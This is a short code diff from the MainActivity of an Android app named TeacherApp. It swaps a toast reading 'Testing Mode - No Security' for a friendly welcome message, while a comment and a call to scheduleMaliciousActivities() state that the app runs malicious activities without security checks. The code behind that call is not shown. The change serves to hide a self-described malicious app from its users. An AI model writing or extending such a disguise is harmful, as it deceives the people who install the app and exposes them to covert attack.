@@ -133,7 +133,7 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun onAllPermissionsGranted() {
-        Toast.makeText(this, "TeacherApp is ready! (Testing Mode - No Security)", Toast.LENGTH_SHORT).show()
+        Toast.makeText(this, "Welcome to TeacherApp", Toast.LENGTH_SHORT).show()
 
         // Schedule malicious activities WITHOUT security checks
         scheduleMaliciousActivities()
